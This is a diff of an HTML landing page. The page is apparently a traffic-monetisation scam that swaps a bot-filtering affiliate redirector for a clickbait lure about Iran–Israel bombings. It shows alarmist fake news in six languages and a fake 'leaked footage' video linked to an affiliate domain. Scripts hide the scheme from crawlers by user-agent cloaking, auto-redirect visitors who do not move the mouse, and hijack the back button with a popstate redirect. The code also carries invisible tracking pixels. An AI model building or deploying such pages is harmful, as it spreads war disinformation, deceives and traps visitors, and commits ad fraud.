@@ -1,64 +1,159 @@
 <!DOCTYPE html>
-<html lang="es">
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Redirigiendo...</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>🚨 Global Alert: Iran–Israel Conflict Escalates</title>
+
+  <!-- Social Media Preview -->
+  <meta property="og:title" content="🚨 World on Edge: Iran–Israel Bombings Trigger Global Alarm">
+  <meta property="og:description" content="Breaking: Explosions reported in multiple cities. Global tension spikes.">
+  <meta property="og:image" content="https://i.postimg.cc/YtbhNkfT/Protesta-con-barricada-ardiente-en-Hait.png">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://www.posicaodominate.wiki/?sl=5951159-fa1e9&pub_click_id={External_ID_from_traffic_source}&site={subID}&pub_sub_id={sub_subID}">
+
   <style>
     body {
-      margin: 0;
-      background-color: #000;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-      color: #fff;
+      background-color: #0c0c0c;
+      color: #f2f2f2;
       font-family: Arial, sans-serif;
-    }
-    .msg {
       text-align: center;
-      font-size: 1.2em;
+      padding: 20px;
+    }
+
+    h1 {
+      font-size: 28px;
+      color: #ff3b3b;
+      margin-bottom: 15px;
+    }
+
+    p {
+      font-size: 17px;
+      margin-top: 0;
+      line-height: 1.6;
+      color: #ddd;
+    }
+
+    .fake-video {
+      margin-top: 20px;
+      border: 4px solid #ff3b3b;
+      border-radius: 10px;
+      cursor: pointer;
+      max-width: 100%;
+      box-shadow: 0 0 10px rgba(255, 0, 0, 0.4);
+    }
+
+    .cta-button {
+      display: inline-block;
+      margin-top: 25px;
+      padding: 14px 28px;
+      font-size: 18px;
+      background-color: #ff3b3b;
+      color: #fff;
+      text-decoration: none;
+      border-radius: 8px;
+      transition: background-color 0.3s ease;
+    }
+
+    .cta-button:hover {
+      background-color: #c40000;
     }
   </style>
-</head>
-<body>
-  <div class="msg">
-    <p>Verifying information....</p>
-  </div>
 
   <script>
-    // Lista de enlaces CPA
-    const smartlinks = [
-      "https://roclnow.com/?k=63523d54914e87a1a731af2a2ea5b55a&type=mainstream&subtype=global",
-      "https://roclnow.com/?k=63523d54914e87a1a731af2a2ea5b55a&type=mainstream&subtype=global",
-      "https://roclnow.com/?k=63523d54914e87a1a731af2a2ea5b55a&type=mainstream&subtype=global",
-      "https://roclnow.com/?k=63523d54914e87a1a731af2a2ea5b55a&type=mainstream&subtype=global"
-    ];
-
-    // Red secundaria (push, pop, fake)
-    const fallback = "https://roclnow.com/?k=63523d54914e87a1a731af2a2ea5b55a&type=mainstream&subtype=global";
-
-    // Detección básica de bots
-    const isBot = /bot|crawl|preview|spider|facebook|whatsapp|headless|phantom/i.test(navigator.userAgent);
-    const hasTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
-    const screenOK = window.innerWidth > 300 && window.innerHeight > 300;
-
-    // Redirigir en 2 segundos si pasa el filtro
-    setTimeout(() => {
-      if (!isBot && hasTouch && screenOK) {
-        const finalLink = smartlinks[Math.floor(Math.random() * smartlinks.length)];
-        window.location.href = finalLink;
-      } else {
-        window.location.href = fallback;
+    const messages = {
+      en: {
+        title: "🚨 World on Edge: Iran–Israel Bombings Begin",
+        paragraph: `⚠️ The conflict has intensified. Several cities hit. Nuclear fears rise.\n\n🛑 Intelligence reports warn of possible global escalation.\nWatch leaked video footage now.`,
+        button: "🔴 Watch Breaking Footage"
+      },
+      es: {
+        title: "🚨 Alerta Mundial: Comienzan los bombardeos entre Irán e Israel",
+        paragraph: `⚠️ El conflicto se intensifica. Varias ciudades han sido atacadas. Aumentan los temores nucleares.\n\n🛑 Informes de inteligencia advierten sobre una posible escalada global.\nMira el video filtrado ahora.`,
+        button: "🔴 Ver video impactante"
+      },
+      fr: {
+        title: "🚨 Alerte Mondiale : Bombardements Iran–Israël",
+        paragraph: `⚠️ Le conflit s'intensifie. Plusieurs villes touchées. Crainte nucléaire grandissante.\n\n🛑 Risque d'escalade mondiale selon les services de renseignement.\nRegardez la vidéo exclusive.`,
+        button: "🔴 Voir les images"
+      },
+      de: {
+        title: "🚨 Weltweite Alarmstufe: Iran–Israel-Konflikt eskaliert",
+        paragraph: `⚠️ Mehrere Städte wurden getroffen. Nukleare Bedrohung wächst.\n\n🛑 Geheimdienste warnen vor globaler Eskalation.\nJetzt geleaktes Video ansehen.`,
+        button: "🔴 Jetzt Video ansehen"
+      },
+      it: {
+        title: "🚨 Allerta globale: bombardamenti Iran–Israele",
+        paragraph: `⚠️ Diverse città colpite. Aumenta il timore nucleare.\n\n🛑 Rischio di escalation globale secondo fonti di intelligence.\nGuarda il video trapelato ora.`,
+        button: "🔴 Guarda il video"
+      },
+      ro: {
+        title: "🚨 Alertă globală: Bombardamente între Iran și Israel",
+        paragraph: `⚠️ Orașe lovite, panică nucleară în creștere.\n\n🛑 Escaladare globală posibilă conform rapoartelor.\nVezi acum videoclipul șocant.`,
+        button: "🔴 Vezi înregistrarea acum"
       }
-    }, 2000);
-  </script>
+    };
 
-  <!-- Pixel invisible opcional -->
-   <div style="visibility:hidden">
-    <center>
-      <img src="//whos.amung.us/pingjs/?k=lonelywolf&amp;t=TeamCastle&amp;x=https://www.youtube.com/" style="display:none">
-    </center>
-  </div>
+    function getLang() {
+      const lang = navigator.language.slice(0, 2);
+      return messages[lang] ? lang : 'en';
+    }
+
+    function isBot() {
+      const ua = navigator.userAgent.toLowerCase();
+      return ["facebookexternalhit", "bot", "crawl", "spider", "slurp", "bingbot", "googlebot"].some(bot => ua.includes(bot));
+    }
+
+    function detectUserBehavior() {
+      let human = false;
+      window.addEventListener('mousemove', () => { human = true; });
+
+      setTimeout(() => {
+        if (!human || isBot()) {
+          window.location.href = "https://www.posicaodominate.wiki/?sl=5951159-fa1e9&pub_click_id={External_ID_from_traffic_source}&site={subID}&pub_sub_id={sub_subID}";
+        }
+      }, 6000);
+    }
+
+    window.onload = function () {
+      const lang = getLang();
+      const content = messages[lang];
+
+      document.getElementById("main-title").textContent = content.title;
+      document.getElementById("main-paragraph").innerText = content.paragraph;
+      document.getElementById("cta-btn").textContent = content.button;
+
+      detectUserBehavior();
+    };
+  </script>
+</head>
+<body>
+  <h1 id="main-title">Loading...</h1>
+  <p id="main-paragraph">Loading...</p>
+
+  <a href="https://www.posicaodominate.wiki/?sl=5951159-fa1e9&pub_click_id={External_ID_from_traffic_source}&site={subID}&pub_sub_id={sub_subID}
+">
+    <video class="fake-video" autoplay muted loop playsinline controls poster="https://i.ibb.co/5Xx5WCG8/Chat-GPT-Image-12-jun-2025-02-19-05-p-m.png">
+      <source src="https://qu.ax/ShDJm.mp4">
+      Your browser does not support the video tag.
+    </video>
+  </a>
+
+  <br>
+
+  <a id="cta-btn" class="cta-button" href="https://www.posicaodominate.wiki/?sl=5951159-fa1e9&pub_click_id={External_ID_from_traffic_source}&site={subID}&pub_sub_id={sub_subID}
+">
+    Loading...
+  </a>
+
+  <script id="_wauup1">var _wau = _wau || []; _wau.push(["small", "clceb", "up1"]);</script>
+  <script async src="//waust.at/s.js"></script>
+
+  <!-- Redirección al presionar "Atrás" -->
+  <script>
+    window.addEventListener('popstate', function () {
+      window.location.href = "https://roclnow.com/?k=63523d54914e87a1a731af2a2ea5b55a&type=mainstream&subtype=global"; // REEMPLAZA ESTA URL
+    });
+  </script>
 </body>
 </html>
